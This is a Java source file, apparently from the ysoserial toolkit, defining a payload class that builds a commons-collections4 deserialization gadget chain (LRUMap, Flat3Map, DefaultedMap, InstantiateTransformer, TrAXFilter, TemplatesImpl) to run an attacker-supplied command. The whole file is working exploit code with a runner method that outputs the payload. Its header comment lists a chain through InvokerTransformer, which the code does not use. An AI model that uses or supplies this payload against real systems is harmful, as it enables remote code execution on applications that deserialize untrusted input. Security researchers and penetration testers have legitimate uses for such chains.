package ysoserial.payloads;

import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.apache.commons.collections4.map.DefaultedMap;
import org.apache.commons.collections4.map.Flat3Map;
import org.apache.commons.collections4.map.LRUMap;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import javax.xml.transform.Templates;
import java.util.Hashtable;
import java.util.Map;

/*
    Cluster3_20222104-204053.txt, first chain.
	Gadget chain:

        chain_LRUMap4-readObject-4ca452f14096da67b70943970bb52b31e127d0aa.txt
            [
         <org.apache.commons.collections4.map.LRUMap: void readObject(java.io.ObjectInputStream)>
         <org.apache.commons.collections4.map.LRUMap: void doReadObject(java.io.ObjectInputStream)>
         <org.apache.commons.collections4.map.AbstractHashedMap: void doReadObject(java.io.ObjectInputStream)>
         <org.apache.commons.collections4.map.AbstractHashedMap: java.lang.Object put(java.lang.Object,java.lang.Object)>
         <org.apache.commons.collections4.map.AbstractHashedMap: boolean isEqualKey(java.lang.Object,java.lang.Object)>
         <org.apache.commons.collections4.map.Flat3Map: boolean equals(java.lang.Object)>
         <org.apache.commons.collections4.functors.ConstantTransformer: boolean equals(java.lang.Object)>  // This is skipped
         <java.util.Hashtable: boolean equals(java.lang.Object)>
         <org.apache.commons.collections4.map.DefaultedMap: java.lang.Object get(java.lang.Object)>
         <org.apache.commons.collections4.functors.InvokerTransformer: java.lang.Object transform(java.lang.Object)>
         <java.lang.reflect.Method: java.lang.Object invoke(java.lang.Object,java.lang.Object[])>
        ]
 */

@Dependencies({ "org.apache.commons:commons-collections4:4.0" })
public class CommonsCollections26_1 extends PayloadRunner
    implements ObjectPayload<LRUMap> {

    public LRUMap getObject(final String command) throws Exception {

        Object templates = Gadgets.createTemplatesImpl(command);

        ConstantTransformer constant = new ConstantTransformer(String.class);

        // mock method name until armed
        Class[] paramTypes = new Class[] { String.class };
        Object[] args = new Object[] { "foo" };
        InstantiateTransformer instantiate = new InstantiateTransformer(
            paramTypes, args);

        // grab defensively copied arrays
        paramTypes = (Class[]) Reflections.getFieldValue(instantiate, "iParamTypes");
        args = (Object[]) Reflections.getFieldValue(instantiate, "iArgs");

        ChainedTransformer chain = new ChainedTransformer(new Transformer[] { constant, instantiate });

        LRUMap lruMap = new LRUMap();

        Hashtable hashtable = new Hashtable();
        hashtable.put("yy", 1);
        ConstantTransformer constantTransformer1 = new ConstantTransformer(hashtable);
        Flat3Map flat3Map1 = new Flat3Map();
        //flat3Map1.put(constantTransformer1, 1);
        flat3Map1.put(hashtable, 1);

        Hashtable wrapped = new Hashtable();
        wrapped.put("zZ", 1);
        /*ConstantTransformer constantTransformer2 = new ConstantTransformer(wrapped);
        Flat3Map flat3Map2 = new Flat3Map();
        flat3Map2.put(constantTransformer2, 1);*/
        DefaultedMap<String,Integer> defaultedMap = (DefaultedMap) DefaultedMap.<Map,Transformer>defaultedMap(wrapped, (Transformer<Integer,String>)chain);
        ConstantTransformer constantTransformer2 = new ConstantTransformer(defaultedMap);
        Flat3Map flat3Map2 = new Flat3Map();
        //flat3Map2.put(constantTransformer2, 1);
        flat3Map2.put(defaultedMap, 1);
        DefaultedMap<String,Integer> defaultedMap2 = (DefaultedMap) DefaultedMap.<Map,Transformer>defaultedMap(flat3Map2, (Transformer<Integer,String>)chain);

        lruMap.put(defaultedMap2, "a");
        lruMap.put(flat3Map1, "b");

        // swap in values to arm
        Reflections.setFieldValue(constant, "iConstant", TrAXFilter.class);
        paramTypes[0] = Templates.class;
        args[0] = templates;

        Reflections.setFieldValue(defaultedMap, "value", chain);

        return lruMap;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsCollections26_1.class, args);
    }
}
